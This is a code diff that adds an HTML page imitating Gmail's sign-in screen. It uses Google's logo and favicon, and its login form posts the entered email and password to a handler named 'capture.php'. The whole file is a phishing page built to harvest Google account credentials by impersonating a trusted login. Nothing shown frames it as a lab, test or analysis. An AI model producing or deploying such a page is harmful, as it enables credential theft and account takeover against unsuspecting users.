@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="https://www.google.com/gmail/about/static/images/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+            <h1 class="title">Sign in</h1>
+            <h2 class="subtitle">to continue to Gmail</h2>
+            
+            <form id="login-form" action="capture.php" method="post">
+                <div class="form-group">
+                    <input type="text" id="email" name="username" required autofocus>
+                    <label for="email">Email or phone</label>
+                </div>
+                
+                <div class="form-group">
+                    <input type="password" id="password" name="password" required>
+                    <label for="password">Password</label>
+                </div>
+                
+                <div class="form-options">
+                    <div class="checkbox">
+                        <input type="checkbox" id="show-password">
+                        <label for="show-password">Show password</label>
+                    </div>
+                </div>
+                
+                <div class="form-footer">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+        
+        <div class="footer">
+            <div class="language-select">
+                <select>
+                    <option>English (United States)</option>
+                    <option>Español</option>
+                    <option>Français</option>
+                    <option>Deutsch</option>
+                    <option>Italiano</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
